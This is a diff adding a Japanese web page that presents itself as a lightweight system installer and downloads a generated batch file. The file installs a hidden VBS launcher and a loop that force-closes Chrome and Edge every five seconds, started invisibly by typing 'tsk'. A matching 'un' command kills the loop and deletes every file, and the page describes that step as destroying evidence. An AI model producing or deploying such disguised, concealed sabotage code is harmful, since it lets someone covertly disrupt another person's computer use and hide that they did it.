@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>【本番用】システムインストーラー</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; text-align: center; padding-top: 50px; background: #f4f4f9; color: #333; }
+        .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .btn { display: inline-block; padding: 15px 40px; font-size: 18px; font-weight: bold; color: #fff; background: #0078d7; border: none; border-radius: 5px; cursor: pointer; text-decoration: none; box-shadow: 0 4px 6px rgba(0,0,0,0.15); transition: background 0.2s; }
+        .btn:hover { background: #005a9e; }
+        .instructions { margin-top: 30px; text-align: left; background: #f9f9f9; padding: 20px; border-left: 4px solid #0078d7; border-radius: 4px; font-size: 14px; line-height: 1.8; }
+        code { background: #eef; padding: 2px 6px; border-radius: 4px; font-family: monospace; font-weight: bold; color: #d0104c; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>超軽量システムインストーラー</h2>
+    <p>下のボタンをクリックすると、設定用バッチファイルがその場で生成されダウンロードされます。</p>
+    
+    <button class="btn" onclick="downloadProductionBat()">setup_system.bat を取得</button>
+
+    <div class="instructions">
+        <strong>【運用の流れ】</strong><br>
+        1. ダウンロードした <code>setup_system.bat</code> をダブルクリックして実行します（管理者権限は不要です）。<br>
+        2. 完了画面が出たら、一度Windowsから<strong>サインアウト（ログアウト）して再ログイン</strong>します。<br>
+        3. <code>Win</code> + <code>R</code> を押し、<code>tsk</code> と入力してEnterで<strong>バックグラウンド監視が完全非表示で開始</strong>されます。<br>
+        4. 元に戻したい（証拠隠滅する）時は、<code>Win</code> + <code>R</code> を押し、<code>un</code> と入力してEnterを押すだけで<strong>すべてが綺麗に消去されて元通り</strong>になります。
+    </div>
+</div>
+
+<script>
+function downloadProductionBat() {
+    // Windows環境の改行コード（\(\r\\)n）に適合させた本番用スクリプト
+    const batText = `@echo off\r\n` +
+                    `setlocal\r\n` +
+                    `chcp 65001 >nul\r\n` +
+                    `set "TARGET_DIR=%USERPROFILE%\\Documents\\MyCommands"\r\n` +
+                    `set "TSK_BAT=%TARGET_DIR%\\tsk.bat"\r\n` +
+                    `set "UN_BAT=%TARGET_DIR%\\un.bat"\r\n` +
+                    `set "LOOP_BAT=%TARGET_DIR%\\loop.bat"\r\n` +
+                    `set "RUN_VBS=%TARGET_DIR%\\run.vbs"\r\n` +
+                    `if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"\r\n` +
+                    
+                    `:: 1. 隠し起動用VBSの作成\r\n` +
+                    `(echo Set ws = CreateObject^("Wscript.Shell"^)\r\n` +
+                    `echo ws.Run chr^(34^) ^& "%LOOP_BAT%" ^& chr^(34^), 0) > "%RUN_VBS%"\r\n` +
+                    
+                    `:: 2. 5秒ごとにブラウザを落とすループ処理\r\n` +
+                    `(echo @echo off\r\n` +
+                    `echo :loop\r\n` +
+                    `echo taskkill /f /im chrome.exe ^>nul 2^>^&1\r\n` +
+                    `echo taskkill /f /im msedge.exe ^>nul 2^>^&1\r\n` +
+                    `echo timeout /t 5 /nobreak ^>nul\r\n` +
+                    `echo goto loop) > "%LOOP_BAT%"\r\n` +
+                    
+                    `:: 3. 起動用コマンド tsk.bat の作成\r\n` +
+                    `(echo @echo off\r\n` +
+                    `echo start wscript.exe "%RUN_VBS%") > "%TSK_BAT%"\r\n` +
+                    
+                    `:: 4. すべてを完全に元通りにする解体用コマンド un.bat の作成\r\n` +
+                    `(echo @echo off\r\n` +
+                    `echo chcp 65001 ^>nul\r\n` +
+                    `echo taskkill /f /im cmd.exe /fi "WINDOWTITLE eq %LOOP_BAT%" ^>nul 2^>^&1\r\n` +
+                    `echo taskkill /f /im wscript.exe ^>nul 2^>^&1\r\n` +
+                    `echo powershell -NoProfile -Command "[Environment]::SetEnvironmentVariable('PATH', [Environment]::GetEnvironmentVariable('PATH', 'User').Replace('%TARGET_DIR%;', '').Replace(';%TARGET_DIR%', ''), 'User')"\r\n` +
+                    `echo timeout /t 1 /nobreak ^>nul\r\n` +
+                    `echo del /f /q "%TSK_BAT%" "%LOOP_BAT%" "%RUN_VBS%" ^>nul 2^>^&1\r\n` +
+                    `echo cd .. ^& rmdir /s /q "%TARGET_DIR%" ^>nul 2^>^&1\r\n` +
+                    `echo ===================================================\r\n` +
+                    `echo  すべての設定を完全に削除し、元通りにしました。\r\n` +
+                    `echo ===================================================\r\n` +
+                    `echo timeout /t 2 /nobreak ^>nul) > "%UN_BAT%"\r\n` +
+                    
+                    `:: 5. ユーザー環境変数 (PATH) への登録\r\n` +
+                    `for /f "tokens=2*" %%A in ('reg query "HKCU\\Environment" /v PATH 2^>nul') do set "OLD_PATH=%%B"\r\n` +
+                    `echo %OLD_PATH% | findstr /I /C:"%TARGET_DIR%" >nul\r\n` +
+                    `if %errorlevel% neq 0 (\r\n` +
+                    `    if "%OLD_PATH%"=="" (setx PATH "%TARGET_DIR%" >nul) else (setx PATH "%OLD_PATH%;%TARGET_DIR%" >nul)\r\n` +
+                    `)\r\n` +
+                    `echo ===================================================\r\n` +
+                    `echo  設定がすべて完了しました！\r\n` +
+                    `echo  一度PCをサインアウトして再ログインしてください。\r\n` +
+                    `echo. \r\n` +
+                    `echo  【開始】Win+R ➡️ tsk ➡️ Enter\r\n` +
+                    `echo  【解除】Win+R ➡️ un  ➡️ Enter\r\n` +
+                    `echo ===================================================\r\n` +
+                    `pause\r\n`;
+
+    const blob = new Blob([batText], { type: "text/plain" });
+    const link = document.createElement("a");
+    link.href = URL.createObjectURL(blob);
+    link.download = "setup_system.bat";
+    
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+}
+</script>
+
+</body>
+</html>
